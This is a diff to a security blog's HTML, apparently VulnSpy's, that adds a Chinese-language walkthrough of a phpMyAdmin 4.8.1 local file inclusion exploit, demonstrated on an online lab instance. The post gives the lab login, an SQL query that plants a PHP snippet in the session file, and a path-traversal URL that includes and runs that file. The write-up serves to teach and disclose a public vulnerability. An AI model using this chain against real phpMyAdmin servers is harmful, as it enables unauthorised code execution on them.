@@ -76,6 +76,68 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-phpMyAdmin-4-8-x-LFI-Exploit" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/" class="article-date">
+  <time datetime="2018-06-21T01:58:48.000Z" itemprop="datePublished">2018-06-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/">phpMyAdmin 4.8.x LFI Exploit</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者: <a href="https://twitter.com/ambulong" target="_blank" rel="external">@Ambulong</a></p>
+<p>今天<a href="http://chamd5.org" target="_blank" rel="external">ChaMd5安全团队</a>公开了一个phpMyAdmin最新版中的本地文件包含漏洞：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="external">phpmyadmin4.8.1后台getshell</a>。该漏洞利用不要求root帐号，只需能够登录 phpMyAdmin 便能够利用。</p>
+<p>在这篇文章中我们将使用VulnSpy的<a href="http://www.vulnspy.com/phpmyadmin-4.8.1/" target="_blank" rel="external">在线 phpMyAdmin 环境</a>来演示该漏洞的利用。</p>
+<p>VulnSpy 在线 phpMyAdmin 环境地址：<a href="http://www.vulnspy.com/phpmyadmin-4.8.1/" target="_blank" rel="external">http://www.vulnspy.com/phpmyadmin-4.8.1/</a></p>
+<h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>参照ChaMd5安全团队发布的文章：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="external">phpmyadmin4.8.1后台getshell</a></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>因为原文中<code>包含数据库文件</code>可能由于文件权限或者帐号权限不足而无法利用，这里我们将使用另外一种方式来利用该文件包含漏洞，即包含session文件。</strong></p>
+<p><strong>1. 进入VulnSpy <a href="(http://www.vulnspy.com/phpmyadmin-4.8.1/">在线 phpMyAdmin 环境地址</a>，点击 Start to Hack ，跳转到VSPlate</strong></p>
+<img src="/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/exp_1.png" alt="Login PMA" title="Login PMA">
+<p><strong>2. 等待载入设置后，点击 GO 按钮开启实验</strong></p>
+<img src="/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/exp_2.png" alt="Login PMA" title="Login PMA">
+<p><strong>3. 实验创建完成后，点击演示地址进入实验</strong></p>
+<img src="/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/exp_3.png" alt="Login PMA" title="Login PMA">
+<p><strong>4. 使用帐号 root ，密码 toor 登录 phpMyAdmin</strong></p>
+<img src="/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/exp_4.png" alt="Login PMA" title="Login PMA">
+<p><strong>5. 点击顶部导航栏中的<code>SQL</code>按钮，执行SQL查询</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();exit;?&gt;'</span></div></pre></td></tr></table></figure>
+<img src="/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/exp_5.png" alt="Login PMA" title="Login PMA">
+<p><strong>6. 获取自己的SESSION ID</strong></p>
+<p>你的 SESSION ID 为 Cookie 中的 <code>phpMyAdmin</code> 项。</p>
+<img src="/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/exp_6.png" alt="Login PMA" title="Login PMA">
+<p>这样对应的SESSION文件为<code>/var/lib/php/sessions/sess_你的SESSION ID</code>。</p>
+<p><strong>7. 包含SESSION文件，成功利用该漏洞</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k</div></pre></td></tr></table></figure>
+<img src="/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/exp_7.png" alt="Login PMA" title="Login PMA">
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/" data-id="cjinwe48h000093pv0dxtpv1d" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞利用/">漏洞利用</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-phpMyAdmin-4-8-x-Authorited-CLI-to-RCE" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/" class="article-date">
@@ -99,7 +161,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>Author: <a href="https://twitter.com/ambulong" target="_blank" rel="external">@Ambulong</a></p>
-<p>Security Team <a href="http://chamd5.org" target="_blank" rel="external">ChaMd5</a> disclose a <a href="https://mp.weixin.qq.com/s/mukO4t_J_SSfGmyfzDo4Fg" target="_blank" rel="external">Local File Inclusion vulnerability in phpMyAdmin latest version 4.8.1</a>. And the exploiting of this vulnerability may lead to Remote Code Execution.</p>
+<p>Security Team <a href="http://chamd5.org" target="_blank" rel="external">ChaMd5</a> disclose a <a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="external">Local File Inclusion vulnerability in phpMyAdmin latest version 4.8.1</a>. And the exploiting of this vulnerability may lead to Remote Code Execution.</p>
 <p>In this article, we will use VulnSpy’s <a href="http://www.vulnspy.com/phpmyadmin-4.8.1/" target="_blank" rel="external">online phpMyAdmin environment</a> to demonstrate the exploit of this vulnerability.</p>
 <p><strong>VulnSpy’s online phpMyAdmin environment address: <a href="http://www.vulnspy.com/phpmyadmin-4.8.1/" target="_blank" rel="external">http://www.vulnspy.com/phpmyadmin-4.8.1/</a></strong></p>
 <h2 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h2><p>1.Line 54-63 in file <a href="https://github.com/phpmyadmin/phpmyadmin/blob/848fed8cbd6b30b4ee6394d5f694b8429119f51c/index.php#L61" target="_blank" rel="external">/index.php</a>:</p>
@@ -1002,6 +1064,10 @@
       <ul>
         
           <li>
+            <a href="/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/">phpMyAdmin 4.8.x LFI Exploit</a>
+          </li>
+        
+          <li>
             <a href="/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/">phpMyAdmin 4.8.x LFI to RCE (Authorization Required)</a>
           </li>
         
@@ -1015,10 +1081,6 @@
         
           <li>
             <a href="/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/">Wordpress &lt;= 4.8.2 SQL Injection POC</a>
-          </li>
-        
-          <li>
-            <a href="/2017/09/05/Wordpress-POST-META-Check-Bypass/">Wordpress POST META_NAME校验绕过</a>
           </li>
         
       </ul>
